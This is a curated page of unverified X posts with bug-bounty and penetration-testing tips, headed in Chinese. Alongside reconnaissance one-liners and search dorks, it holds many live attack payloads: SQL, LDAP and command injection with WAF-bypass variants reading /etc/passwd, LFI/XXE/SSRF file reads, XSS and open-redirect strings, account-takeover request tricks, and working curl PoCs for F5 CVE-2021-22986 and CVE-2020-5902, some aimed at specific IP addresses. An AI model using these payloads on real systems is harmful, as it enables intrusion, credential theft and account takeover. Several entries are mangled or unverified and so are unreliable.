# X 语料 · 方法论（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[选题与探索](../hunting-strategy.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-methodology-2（287 条）、x-exp-mindset（69 条） · 本文 1,138 行

- PostgreSQL time-based payload:
  1 AND 1=(select 1 from PG_SLEEP(10)) --' AND 1=(select 1 from PG_SLEEP(10)) OR '1'='
- Can't use spaces,semicolons,${IFS},comments . . etc to pass your arguments or break out of the current command?
  It's easy, just use comma, braces and Parentheses.
  1$({sleep,10})1
- If you find an application.wadl file for an API and want more juicy information about each call, try application.wadl?detail=true
- Open redirect: a Unicode character browsers normalize to a dot — 。(URL-encoded %E3%80%82), so http://google。com resolves to http://google.com
- inurl:fisheye AND inurl:changelog -site:http://atlassian.com -site:http://github.com
  inurl:crucible AND inurl:changelog -site:http://atlassian.com -site:http://github.com
  Lots of interesting fisheye/crucible code commits and reviews.
- One liner to fetch all URLs in scope of all public programs:
  curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json… |jq -r '.[].targets.in_scope[] | select(.asset_type|contains("URL")) | .asset_identifier' |grep -v "*" | sort
  (wildcard domains excluded)
- [2] .. When reviewing code of Ruby-based apps, always look for interesting parameters such as passwords, keys, and see the code if you can find them included in the `Rails.application.config.filter_parameters`
  If they aren't? they've been logged!
- If you are able to exploit rails CVE 5418
  try these things, you may end up getting the database file's credentials
  config/database.yml
  /opt/config/database.yml
  /var/config/database.yml
  /var/company_name/config/database.yml
  The /var/<company_name>/config/database.yml variant is the one that worked.
- URL-parameter extraction regexes (Burp rejects the ^-escaped variant):
  1. (\?|\&)([^=]+)\=([^&]+)+(\&|\?)(.*?)\=(.*?)
  2. simpler variant:
  /[(\?|\&)]([^=]+)\=([^&#]+)/g
  3. [^&?]*?=[^&?]*
- URL parameters with a JS regex:
  url.html?id=1337&#Sujeet=hahaha
  url.html
  url.html?funny=14114&#Sujeet=hahaha
  RegexEx: pattern:
  (\#|\?)(.*?)\=(.*?)
- Payload (leaks ADMIN_TOKEN through a Flask/Jinja globals lookup):
  /?filename={0.__init__.__globals__[ADMIN_TOKEN]}
- If you want to fast-test @TomNomNom gf grep list you can use this trick 'gf --list | parallel 'echo {}: $(gf {} | wc -l) | grep -v ": 0"'' (use xargs -I {} instead of parallel if you don't want to install it)
search the "back" or "redirect" etc. words in page source for open redirect and write it to url.
  For Example: target[.]com/vulnerable_url?redirect=payload
- https://securityinsider-wavestone.com/2019/07/writeup-lehack-yeswehack-2019.html…
  /proc/self/cwd points at the current working directory, e.g. cat /proc/self/cwd/main.py (CTF).
- Dork for finding Google acquisitions: site:http://whois.com intext:Google Inc -inurl:google
- Don't forget for console.log() if alert()/confirm()/prompt() are blocking!
- Apache server-status: if exploitable, try GET /server-status/common.htm for server status access.
- Add /uplynk/examples/dash.html to your DIR wordlist; keep a private list of DIRs found while hunting.
- file.php?url=/admin/
  Redirects to: http://website.com/admin/
  Put URL file.php?url=@google.com
  Now it is website.com@google.com which redirects to http://google.com!
- Rails development-mode dorks:
  inurl:/rails/info
  inurl:/rails/info/routes
  inurl:/rails/info/properties
- Do you wanna test a website and wanna find out if they have a bug bounty program?
  Use google dorks and do:
  “bug bounty” site:http://tesla.com
  or
  “bug bounty” “tesla”
- Need a server which restarts itself after every single request? Set it up using netcat via this one-liner! 😉
  while :; do (echo -ne "HTTP/1.1 200 OK\r\nContent-Length: $(wc -c <index.html)\r\n\r\n"; cat index.html) | nc -l -p 8080; done
- Subdomain takeover, first pass: cat subdomains-list.txt | xargs -I % host % — prints alias and IP per subdomain, revealing any that point to a different root domain.
- You can find deep domains without tools. like this simple dorks:
  site:*.site.com -www
  site:*.*.site.com -www
  site:*.*.*.site.com -www
- When gobuster (by @TheColonial) errors out with "Unable to connect", fall back to a curl loop:
  for i in `cat /s3clist/Discovery/Web-Content/big.txt`;do curl -ik https://host/"$i";done
- Got to many results from google dorks?
  Remove uninteresting buzzwords with: "-"
  site:http://paypal. com -demo -Capital
- oneliner to retrieve ASN numbers of a company.
  (ls /tmp/GeoLite2-ASN-CSV.zip||wget --quiet -P /tmp "https://geolite.maxmind.com/download/geoip/database/GeoLite2-ASN-CSV.zip…") 2>&1|grep X; unzip -c /tmp/GeoLite2-ASN-CSV.zip|grep -i airbnb|cut -d ',' -f 2|sort -fu
  https://pastebin.com/G44mnY2x
- Instead of attacking WordPress sites directly, search GitHub Code for their leaked wp-config.php: https://github.com/search?utf8=%E2%9C%93&q=extension%3Aphp+filename%3Awp-config.php+language%3APHP&type=Code&ref=advsearch&l=PHP&l=…
- Non-standard vulnerabilities:
  - go to Google search for 'site: <yourdomain>'
  - go to last page
  - look for e-mail addresses disclosed in URLs (usually in forget password or invitation functionalities)
  - report as incorrectly configured indexing protection
NGINX error_page request smuggling
  Example Vulnerable Request
  GET /a HTTP/1.1
  Host: localhost
  Content-Length: 56
  GET /_hidden/index.html HTTP/1.1
  Host: notlocalhost.
  Vulnerable Versions: 1.8.1
  1.8.1
  1.9.5
  1.14.1
  1.14.2
  1.15.9
  1.16.1
  1.17.6
- Sort a subdomain list by third/fourth level: cat domains | rev | sort | rev
- Hosts extracted from a wayback list:
  cat targets | waybackurls | awk -F'//' '{print $2}' | awk -F'/' '{print $1}' | sort -u
- Create a list of interesting keywords for grep:
  $ echo „password\ntoken\nsecret\nusername“>~/dict/words.txt
  $ alias secgrep=‚grep -f ~/dict/words.txt‘
  $ secgrep -r somedir/
  somedir/file.php: dbpassword: hunter2
- Combine Arjun with Burp Intruder to brute-force parameter values: "?debug" was a valid parameter and "on" the working value, disclosing data that chained to a P1 — final payload "?debug=on"
- -API TIP: 31/31-
  Found a "limit" / "page" param? (e.g: /api/news?limit=100) It might be vulnerable to Layer 7 DoS. Try to send a long value (e.g: limit=999999999) and see what happens :)
- Companies leak users and internal information through pdf/ppt/doc files — dorks:
  site: http://target.com filetype: pdf
  site: http://target.com filetype: doc
- Chain Wayback Machine with parameth:
  1. Run waybackmachine on domain.
  2. Make a get request to each path and look for != 404
  3. Run parameth.
- Extract links from .js files! Simple regex - `(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+`
- Hidden files worth requesting: inurl:"wp-config.php.bak" holds the WordPress configuration.
- A quick way to print the subnets of an organization by ASN : whois -h http://whois.radb.net -- '-i origin AS32934' | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
- When taking out parameters from a waybackurls list
  You can try this:
  cat waybackurls.txt | grep "[=?]" > wayback_params.txt
- If you're trying out XXE and you are not allowed to define DOCTYPE declaration is disallowed, try:
  <foo xmlns:xi="http://w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>
- Horizontal priv escalation & full account takeover
  1. register a new user in your company at "/api/register/48e33445-f797-4e62-801f-efb3dbf8f66f" (UUID)
  2. changed the UUID to a numerical value -> "2"
  3. user created under another company
  4. full account takeover
- [XSSI]
  While testing for XSSI, if your response's Content-Type has application/json but body has JSONP/javascript, don't give up! Look again and if the X-Content-Type-Options with `nosniff` directive is absent, your exploit still should work!
- (1) Want all IP&email addresses, URLs and domains from all repos by a Github user?
  url -s hxxps://api.github.com/users/uber/repos?per_page=100 | ruby -rjson -e 'JSON.load(hxxp://STDIN.read).each {|repo| %x[git clone #{repo["clone_url"]} ]}'
- /api/v1/users/profile?id=MYID -> HTTP 200 with my data
  /api/v1/users/profile?id=ANOTHERUSERID -> HTTP 401
  /api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 with my data and the other user's data 👀
- Alibaba WAF bypass:
  alert(0),prompt`1`,confirm() >> Blocked!
  Bypass: z=confirm,z(0)
- Password reset and email change reuse the same token:
  1) Click on forget password and check the link token.
  2) Now see other changes like Email change for profile.
  3)Both token are same.
  Impact: If attacker get any one token he can able to make ATO.
- Always test if site has users directory under /api/
  GET /api/users -> 404
  POST /api/users -> 200
  PUT /api/users (body -> user=mail@company.com&pass=123) -> 201
  Registered company's Email,may lead to Admin Panel Takeover
- HPP attack
  inject parameters into a URL, which are then reflected back to the page user
  http://host/page.php?par=123%26action=edit
  <? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>
  <a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>
- my id=123
  id=123 - ok
  id=122 - 403
  id=123-1 - ok, my id
  id=122-1 - ok, not my id
- 1) dig html response page and discover /wp-content path
  2) use of wpscan
  3) find out access to debug.log file
- Dorks for responsible-disclosure programs:
  intext:” Responsible Disclosure Policy”
  "responsible disclosure" "private program"
  "responsible disclosure" "private" "program"
   responsible disclosure "bounty"
- LDAP injection payloads (1/3):
  Payloads :
  *
  *)(&
  *))%00
  )(cn=))\x00
  *()|%26'
  *()|&'
  *(|(mail=*))
  *(|(objectclass=*))
  *)(uid=*))(|(uid=*
  */*
  *|
  /
  //
  //*
  |
  admin*
  admin*)((|userpassword=*)
  admin*)((|userPassword=*)
  x' or name()='username' or 'x'='y
- IP rotation with the NordVPN CLI (1/4):
  ``nordvpn connect [country_code][server_id]`` 1/4
- Sometimes you just need to enter a simple payload：
  \u003cembedsrc=javascript:alert(document.domain)\u003
- Extract URLs to collecting urls from source
  Can chains with gau / waybackurls
  echo domain | waybackurls | xurls
  https://github.com/vsec7/xurls
- Some google dorks to find websites with mini profiler :
  intext:"from start (ms)"
  intext:"display the rack environment"
  intext:"show trivial"
  inurl:"mini-profiler-resources"
  This gives much noise : inurl:"?pp=env"
  Research : https://towardsdatascience.com/leaking-secrets-in-web-applications-46357831b8ed…
- Bash one-liner merging waybackurls and gau output: (echo gau $1 & echo waybackurls $1) | parallel | sort -u
- Make the output of Wappalyzer into something human-readable.
  from Sudomy by @Screetsec
  webtech(){
  wappalyzer $1 2> /dev/null | jq -r '.applications[] | "\(.name) \(.version)"' | sed 's/ null$//g' | sed 's/,/./g' | sed ':a;N;$!ba;s/\n/, /g'
  }
- Command injection filter bypasses (1/3):
  cat /etc/passwd
  cat /e"t"c/pa"s"swd
   cat /'e'tc/pa's' swd
  cat /etc/pa??wd
  cat /etc/pa*wd
  cat /et' 'c/passw' 'd
  cat /et$()c/pa$()$swd
- Found a directory listing?
  You can use `wget -r --no-parent http://target.com/dir` to recursively fetch all the files (+structure) to your machine.
  Now you can view the structure, search, and grep in files.
- Open redirect payloads:
  //#//google.com/
  //www.google.com/%2f%2e%2e
  //www.google.com/%2e%2e
  //;@google.com
  //%09/google.com
  //%http://5cgoogle.com
  //google.com/..;/css
  //\http://google.com
  //%EF%B9%B0/https://google.com
- Exploit (CVE-2020-5902-style /..;/ path traversal to fileRead.jsp):
  https://35.221.124.131:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
  https://150.61.54.202/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
- Subdomain scan + link listing in one line:
  dnsmap <sitio> -r goo.txt && cat goo.txt | grep <sitio> > g.txt && xargs -n 1 curl -0 < g.txt | grep -Eio "(ft|htt)p(s)?://[^ \"]*" | sort | uniq > fin.txt
- https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
- ATO through the email-change request: it carries the userid, so swap in the victim's userid → their email gets changed.
- Always read the responses: they can carry email/account-confirmation tokens. The verification link is xx+.com/verify?token={Token} — and the tokens are often identical.
- Remove Yahoo "Will be right back..." false positives:
  cat endpoints.txt | xargs -I{} sh -c 'if curl -s "{}" | grep -q "Will be right back..."; then :; else echo {}; fi' | grep "http" | tee -a results.txt
- extract endpoints from JavaScript files by @renniepak
  cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
- Wordlistgen by @ameenmaali builds target-specific wordlists and pipes with other tools:
  cat targets.txt | gau | wordlistgen |sort -u | tee wordlist.txt
  https://github.com/ameenmaali/wordlistgen…
- dirsearch on a target reveal configs folder. Trying /configs/config.php gave 200 OK with empty content.
  Tried /configs/.config.php.swp and got the database credentials.
  Autosave files are worth trying too (by @admiralgaust).
- Running many dirsearch instances in parallel: use --clean-view (e.g. cat hosts.txt | xargs -I {} -P5 dirsearch -u {} -E --clean-view).
- dirb http://*IP/FQDN* /usr/share/dirb/wordlists/common.txt -w -X .php,.html,.txt
- /api == 403 change to /Api ==200
- Returns more domains than plain curl:
  psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
- Sort the dirs meg produced by file count to spot domains answering 200 for any dir:
   find . -xdev -type f | cut -d "/" -f 2 | sort | uniq -c | sort -n
  to sort the meg dir by number of files to identify domains with 200 response for any dir
- Found LFI and program have *.example.com scope? You can find many new subdomains in /etc/hosts file.
- Fast port scanning using naabu:
  { assetfinder -subs-only target > target.txt}
  { for domain in $(cat target.txt);do naabu -host $domain; done}
- Collect Subdomains Using SecurityTrails API
  curl -s https://api.securitytrails.com/v1/domain/$1/subdomains?apikey=API_KEY… | jq '.subdomains[]' | cut -d '"' -f2 | awk -v myvar="$1" '{print $0"."myvar}' | sort -u
- Get Subdomains with alienvault.
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/paypal.com/passive_dns…" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
- Download JS from Wayback Machine:
  waybackurls $DOMAIN | grep "\.js"| anew |rush -j 50 'wget -P js/ {} '
  https://github.com/tomnomnom/waybackurls…
  https://github.com/tomnomnom/anew
  https://github.com/shenwei356/rush
- tac hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
  https://github.com/dwisiswant0/unew…
- cat hosts | xargs -I@ sh -c 'python3 http://dirsearch.py -r -b -w path -u @ -e php,html,json,aspx'
- You can rate dirsearch using 1 thread and combining it with the -s argument dirsearch -t 1 -s 1 -u http://*.yahoo.com/ -e php -H 'X-Bug-Bounty-Creds: aaaaaa'
- try this to find some "private" bug bounty programs
  inurl:security ext:txt
- cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
- Build your own wordlist from wayback paths (credit @NahamSec):
  echo "http://api.uber.com" | waybackurls | cut -d "/" -f 4,5 | sed 's/?.*//' | sort -u
- echo "domain" | waybackurls | unfurl paths
- Extract your targets from all SONAR FDNS V2 data:
  - download all data from https://opendata.rapid7.com/sonar.fdns_v2/
  - pigz *.json.gz -dc| grep -iE ‘\.yahoo.com'|jq .name|sed 's/"//g'|grep -iE ‘\.yahoo.com$'
- Screenshot service that renders a supplied URL → SSRF and local file read:
  file:///etc/passwd
- Jira user enumeration (CVE-2020-14181) — the -G form is what works:
  curl -s -G jira-domain/secure/ViewUserHover.jspa?username=admin -k | grep "user"
- curl -s -G jira-domain/secure/ViewUserHover.jspa?username=user -k | grep "user"
  CVE-2020-14181
- Postman documenter dork — API collections are shared there and often leak sensitive endpoints:
  site:documenter[.]getpostman[.]com target[.]com
- Directory traversal filter bypass:
  path=\\../\\../\\../\\../\\../\\../\\../\\../\\..//windows/
- HTTP Response Injection
  api[DOT] redacted[DOT]com/data/2.5/weather%0a%0dContent-Type:text/html%0a%0d%0a%0d.....
  https://knowcybersec.com/2019/11/how-to-approach-web-application.html?m=1…
- -Find files containing specified text string recursively in the current directory, type:
  grep -H -r -i "file:" http://facebook.com*
  -Results:
  File system paths:
  file:///C:/Users/xxxx/xxxx/xxxx
- If there is a WAF or filter to block RCE and LFI, you can bypass it with globbing.
  /usr/bin/cat /etc/passwd == /???/???/c?t$IFS/???/p?s?w?
- gau http://hacked-site.com | waybackurls | grep ".xlsx"
  The same one-liner surfaces .xlsx files full of leaked PII (credit @TomNomNom, @hacker_).
- POST /api/v1/resetpassword
  ...
  {"email":"victim@victim.lol"}
  ---> {"email":["victim@victim.lol","ATTACKER_EMAIL_ADDRESS"]}
- AS="AS15169";whois -h http://whois.radb.net -- "-i origin ${AS}"|grep "^route:"|cut -d":" -f2|sed -e 's/^[ \t]//'|sort -nt . -k1,1 -k2,2 -k3,3 -k4,4|cut -d ":" -f2|sed -e 's/^[ \t]/allow /;s/$//;s/allow *//g'
  All subnets for one AS (Google here):
- Browser-Based application LFI
  file:///etc/passwd blacklisted? Use "view-source:file:///etc/passwd"
  "view-source" is often forgotten by developers in blacklists.
- Extract domains from Reverse domain lookup
  for i in `echo {1..255}`;do host -t ns 157.240.23.$i | egrep -Ev "not found."|awk '{print $5}';done
- Always look for any parameters reflecting in the javascript functions like in a variable. If there is no url encoding of characters like ; ) } you can close that function to insert your malicious javascript
   Ex. ;)}alert(1)/
- urlencode email bypass:
  admin%http://40gmail.com%20%7C%7C%20cat%20%2Fetc%2Fpasswd%20%7C%7C%20echo
  Urldecode: admin@gmail.com || cat /etc/passwd || echo
- Extract URLs from junk data with grep:
  cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
  curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
- extract all javascript links/files from a domain using gau and grep.
  echo domain | gau | grep -Eo "https?://\S+?\.js"
- wfuzz tips
  Fuzzing Parameters In URLs
  $ wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ…
  Fuzzing POST Requests
  $ wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php
- Extract URLs / Endpoints:
  🙂
  curl https://targetsite.com -s | sed s/href=/"endpoint:"/g | sed s/" "/"\n"/g | tr "<>" "\n" | grep endpoint:
  curl https://targetsite.com -s | sed s/src=/"endpoint:"/g | sed s/" "/"\n"/g | tr "<>" "\n" | grep endpoint:
- 📢 Today's
  Working on some file inclusion vulnerabilities? Here are different ways for /etc/passwd:
  /e?c/?asswd
  /e*c/*asswd
  /??c/?asswd
  /??c/?assw?
  a=l;b=s;$a$b
  /bin/[a-z]at /e$1tc/pa\ss'w'?
- 📢 Today's
  Account takeover tricks:
  1. Parameter pollution:
  email=victim@mail.com&email=hacker@mail.com
  2. Email array:
  {"email":["victim@mail.com","hacker@mail.com"]}
  3. Separator:
  email=victim@mail.com,hacker@mail.com
  Happy hacking!
- GET /admin HTTP/1.1
  Host: http://site.com
  ...
  Access is denied
  GET /test HTTP/1.1
  Host: http://site.com
  X-Original-URL: /admin
  HTTP/1.1 200 OK
- 1. Always Read Responsible Disclosure very well.
  2. Here are different ways for /etc/passwd:
  /e?c/?asswd
  /e*c/*asswd
  /??c/?asswd
  /??c/?assw?
  a=l;b=s;$a$b
  /bin/[a-z]at /e$1tc/pa\ss'w'?
- If you find a LFI ignore /etc/passwd and go for /var/run/secrets/kubernetes.io/serviceaccount this will raise the severity when you hand them a kubernetes token or cert.
- xargs -a YOURLISTDOMAIN -I@ sh -c 'curl -s "https://crt.sh/?q=%25.@&output=json…" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew resul '
- So, this a logic flaws(parameter manipulation) that I’ve seen occurred in transfer processes whereby the application accepts to transfer negative value from attackers account which results to attacker getting credited back the amount... e.g ?trans=-3000&to=Acctno
- Finding Endpoints:
  cat js | grep -o -E "(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+"
  Credit :- @hunter0x7
- Quick tactic for Critical Bug
  Add '_profiler' in your path `target/_profiler` if 200 OK
  Check for `Symfony` in the body if OK
  You can see logs and env and database credentials
  and any request cookies
- Infomation disclouser
  -www.target.com fuzz with git wordlist
  -target.com/.git = 403
  -Again fuzz http://target.com/.git/FUZZ
  With git config wordlist
  -target.com/.git/logs/HEAD =》200 Ok
  Leaking tons of sensitive information
1/n
- -waybackurl target.txt | grep "xmlrpc.php"
  List of urls with xmlrpc enabled
  Exploited xmlrpc with http://pingback.ping
  Got origin ip
  Put origin ip in Host:
  Rate limit Bypassed on all functions
  Conclusion: no rate limit on server side
- Need to copy terminal output to the clipboard on X11? install xclip: apt-get install xclip setup bash alias: alias xclip=’xclip -selection c’ profit: egrep ‘interesting’ <corpus> | xclip (OSX? see pbcopy/pbpaste!)
- Target has a function to invite people to edit personal documents.
  site:http://target.com inurl:token
  Edit any user's documents.
- Deduplicate - Remove duplicate urls
  echo domain | waybackurls | deduplicate --hide-images --sort
  https://github.com/nytr0gen/deduplicate…
  https://github.com/ameenmaali/urldedupe…
- Write-up: exploiting Application-Level Profile Semantics (ALPS) from Spring:
  curl -H 'Accept:application/schema+json' -v http://localhost:8080/alps/profile/users
  https://niemand.com.ar/2021/01/08/exploiting-application-level-profile-semantics-apls-from-spring-data-rest/…
- Open Redirect Payload
  HTTP%09:3627734734
  HTT%70%3a3627734734
  HT%09tP%3a3627734734
  %48%54%74%50:%2f3627734734
  %48%54%74%50%3a%2f3627734734
  %68%54%54%50%3a%2f%http://2fgoogle.com
  %48%54%54%50:3627734734
- Command injection Filter Bypasses
  cat /etc/passwd
  cat /e"t"c/pa"s"swd
   cat /'e'tc/pa's' swd
  cat /etc/pa??wd
  cat /etc/pa*wd
  cat /et' 'c/passw' 'd
  cat /et$()c/pa$()$swd
  {cat,/etc/passwd}
  cat /???/?????d
- $ gau http://paypalobjects.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u >> paypalJS.txt
   $ gau http://paypal.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u >> paypalJS.txt
  https://gist.github.com/m4ll0k/31ce0505270e0a022410a50c8b6311ff…
  @m4ll0k Nice BRO!
- xargs -a domains -I@ sh -c 'gau @ |grep -iE '\.js'|grep -ivE '\.json'|sort -u >> JS.txt' ; xargs -a JS.txt -n2 -I@ sh -c 'echo -e "\n[URL] @\n"; python3 http://linkfinder.py -i @ ' >> Url.txt
- Account takeover with JSON
  {"password":"1234",token="123"} -> 200 OK
  {"password":"1234","email":"victm@gm.com","token="123"} -> 200 OK
  Hidden email add
- Small trick can save a lot of time in pentest
  e.g. searching nmap scripts:
  alias nscript="ls /usr/share/nmap/scripts/ | grep "
  nscript ftp
  You can also add it in ~/.bashrc file.
- Made something
  inurl:"http://documenter.getpostman.com" target
  site:http://*.jira.com "target"
  site:http://jira.com "target"
  inurl:"https://groups.google.com/g/" target_name
- Pimcore CMS: try '/js/routing' and '/js/routing?callback=fos.Router.setData' — leaks admin information and paths.
- Some of the best open redirect filters bypasses:
  /%2F/xhzeem.me
  %252F@xhzeem.me
  //xhzeem.me\@.website.com
  //xhzeem.me\\@.website.com
  //xhzeem.me%FF@website.com
  //xhzeem.me%23@website.com
  //website.com/../..%20.xhzeem.me
- When you find input field which allows " (quotes), try this payload:
  "autofocus onfocus=alert(1)// -> Doesn't work
  "type%3d"text"autofocus%20onfocus%3d"alert(1)" -> Works
- grep -rioP '$_GET[\s*["']\s*\w+\s*["']\s*]' PHPSOURCE | grep -oP '$_GET[\s*["']\s*\w+\s*["']\s*]' | sed -e "s/$_GET[\s*["']//g" -e "s/\s*['"]\s*]//g" | sort -u > /tmp/outfile.txt
  https://github.com/maK-/parameth
- cat findomain1 | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' | fff
  https://github.com/KingOfBugbounty/KingOfBugBountyTips…
- wget https://opendata.rapid7.com/sonar.fdns_v2/2021-01-30-1611965078-fdns_a.json.gz… ; gunzip 2021-01-30-1611965078-fdns_a.json ; cat 2021-01-30-1611965078-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
- Useful Google Dorks when you are Hunting in a big scope
  *.target.com
  site:.*.target.com ext:php
  site:.*.target.com ext:asp
  site:.*.target.com ext:aspx
  You can combine these dorks with other dorks like intitle , inurl etc
- URL :- /api/message/delete
  {"groupID":20, "messageID":"xyz123"}
  [200 OK response because 20 is owned by you]
  {"groupID":21,"messageID":"Any21MsgID"}
  [403 Forbidden]
  {"groupID":20,"messageID":"Any21MsgID"}
  [200 OK]
  $$$ Bounty
- Creating JavaScript strings without quotation marks:
  /keyword/.source
  44440805209..toString(36) (get the number with parseInt("keyword",36))
  `keyword`
  String.fromCharCode(107,101,121,119,111,114,100)
  String.fromCodePoint(107,101,121,119,111,114,100)
- assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew
by @sec715
  GET /?cc=cat+/etc/passwd
  403 Forbidden
  GET /?cc=/???/??t+/???/??ss??
  200
  root:x:0:0:root...
- 😈 How to extract Python source code from Py2App packed Mach-O Binaries by @lordx64
  1. Mount the dmg using hdiutil
  2. Find the packed file
  3. binwalk
  4. Patch the target bytecode with the proper header (e.g. using Hex Fiend)
  5. decompyle3
  https://lordx64.medium.com/how-to-extract-python-source-code-from-py2app-packed-mach-o-binaries-4da244e54c88…
- for i in $(seq 1 6); do curl -s https://github.com/uber?page=$i |grep "data-hovercard-url=" |grep -v "user" |cut -d"=" -f4 |cut -d "/" -f3 >> uber.txt ;done
  and
  for repo in $(cat uber.txt); do gitleaks --repo-url=https://github.com/uber/$repo -v ;done
- Hi peoples!
  CVE-2021-22986: Execute arbitrary system commands create or delete files disable services.
  PoC #1
  curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'
- Finished her! Lol
  PoC #3
  curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d '{"filePath":"id"}'
- Don't forget to check if your target company has a private api documention
  site:http://documenter.getpostman.com "org"
- Looking for BAC issues, Try this
  You have a endpoint :
  GET /api/org/1234/members/123/profile
  Try:
  GET /api/orgs/1234/members/123/profile
  GET /api/org/1234/members/123
  GET /api/orgs/1234/members
  GET /api/orgs/1234
  GET /api/orgs
- Looking for BAC issues, Try this
  You have a restricted endpoint :
  GET /api/users/123/profile
  Try:
  GET /api/users/123/profile
  POST /api/users/123/profile
  PUT /api/users/123/profile
  PATCH /api/users/123/profile
  DELETE /api/users/123/profile
- Found 403 bypass just now:
  https://<redacted>.com/aspnet_client/ - 403
  https://<redacted>.com/aspnet_client/.././ - 200 OK and landed on Login page [Still trying to escalate, let's see : )]
- Looking for BAC issues, Try this
  𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁 :
  PATCH /api/users/123
  ...
  {"email":"newEmail@com"}
  𝗧𝗿𝘆 𝗧𝗵𝗶𝘀:
  PATCH /api/users
  ...
  {"id":"1234","email":"newEmail@com"}
- curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json… | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 http://paramspider.py -d'
- RCE WAF bypass:
  ;+$u+cat+/etc$u/passwd$u
  ;+$u+cat+/etc$u/passwd+\#
  /???/??t+/???/??ss??
  /?in/cat+/et?/passw?
- <isindex action=javascript:alert(“huntdb has been updated”) type=image>
  https://github.com/ARPSyndicate/KaaS/commit/cd5a2a3b1f6d28518703c2fd4f0fda400aa6b421…
  …
  April 13, 2… …
- Tip for API testing: most APIs will have and endpoint for creating, deleting, updating and reading an object or collection of objects. If you see DELETE /api/item/32, try for POST /api/item (create) GET /api/item/33 (read) and SET /api/item/33 (update)
by @ManasH4rsh Extract all endpoints from a JS File with this oneliner:)
  cat files.txt | grep -aoP "(?<=(\"|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\"|\'|`))" | sort -u | tee output.txt
- just an example how commands can be obfuscated
  skid=(i h w o a m r w X);s=(2 1 3 4 5 0);for i in ${s[@]};do echo ${skid[$i]} | tr -d '\n';done |$0
- If your target have documents upload section and making it private or public the try this
  inurl:”https://site.com/anything/document_endpoint_here…”
  example:
  inurl:"https://in.docworkspace.com/d/"
  Try with google drive link also
- technique : -
  GET /v1/users/1 HTTP 1.1
  401 unauthorized
  DELETE /v1/users/1 HTTP 1.1
  200 OK
- curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json… | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 http://paramspider.py -d @'
  Full programs enumerate paramspider .
- technique :~
  GET /page.php?path=../../etc/passwd
  Forbidden 403 ?
  Try One Of These :~
  ../../../etc/passwd%00
  ....//....//....//etc/passwd
  %252e%252e%252fetc%252fpasswd
  Result :
- Collect parameters in response which located in input tags.
  Like <input name="something">
  cat urls | parallel -j 200 curl -s {} | grep "<input" | grep -oP 'name="[a-zA-Z0-9-_]{1,}' | cut -d'"' -f2 | sort -u | tee params
- Bug Bounty Technique:
  GET /page.php?path=../../etc/passwd
  Forbidden 403 ?
  Try One Of These:
  (1)../../../etc/passwd%00
  (2)....//....//....//etc/passwd
  (3)%252e%252e%252fetc%252fpasswd
- OS Command Injection with WAF Enabled:
  Reading /etc/passwd file:
  cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
- Tip:
  1. As User-1, create a goal
  2. Capture the request
  3. Replace base64 encoded ownerId value of User-1 by User-2
  4. Forward request
  5. Goal got created with owner as User-2.
- Tip:
  1. As Admin see request on how delete function is being used
  2. As User, copy that above request of delete function
  3. Replace Admin_session_id by User_session_id
  4. Forward request >> Values deleted by User.
- File upload: try multiple extensions and bypasses, including filename="../.." and then check the root page — unless the file goes to a CDN, in which case it won't appear there.
- Automate Prototype Pollution(check threads):
